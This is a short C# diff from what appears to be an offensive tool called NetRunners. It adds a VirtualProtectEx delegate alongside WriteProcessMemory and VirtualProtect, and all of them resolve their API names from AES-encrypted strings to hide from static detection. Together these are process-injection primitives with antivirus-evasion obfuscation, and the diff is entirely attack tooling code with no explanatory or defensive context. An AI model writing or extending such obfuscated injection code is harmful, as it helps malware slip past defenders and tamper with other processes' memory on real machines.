@@ -145,6 +145,10 @@ namespace NetRunners.Delegates
         public delegate int pVirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
         public static pVirtualProtect VirtualProtect = (pVirtualProtect)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), DecryptBytesToStringAes(VirtualProtect_Bytes, AesKey)), typeof(pVirtualProtect));
 
+        //// import VIRTUALPROTECTEX
+        public delegate int pVirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+        public static pVirtualProtectEx VirtualProtectEx = (pVirtualProtectEx)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), DecryptBytesToStringAes(VirtualProtectEx_Bytes, AesKey)), typeof(pVirtualProtectEx));
+
         //// import WRITEPROCESSMEMORY
         public delegate int pWriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
         public static pWriteProcessMemory WriteProcessMemory = (pWriteProcessMemory)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), DecryptBytesToStringAes(WriteProcessMemory_Bytes, AesKey)), typeof(pWriteProcessMemory));
